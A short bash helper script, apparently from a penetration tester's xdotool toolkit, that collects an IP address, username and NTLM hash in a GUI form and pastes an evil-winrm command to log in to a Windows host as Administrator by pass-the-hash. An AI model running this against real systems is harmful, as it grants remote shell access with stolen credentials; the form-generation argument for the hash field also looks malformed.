#!/bin/bash

: '
Connect with Evil-WinRM as Administrator using NTLM hash.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form '{"label": "IP address", "type": "text", "name": "IP"}''{"label": "Username", "type": "text", "name": "Username"}'"Hash"

IP=${form_data["IP"]}
USERNAME=${form_data["Username"]}
HASH=${form_data["Hash"]}

paste_command "evil-winrm -i ${IP} -u '${USERNAME}' -H '${HASH}'"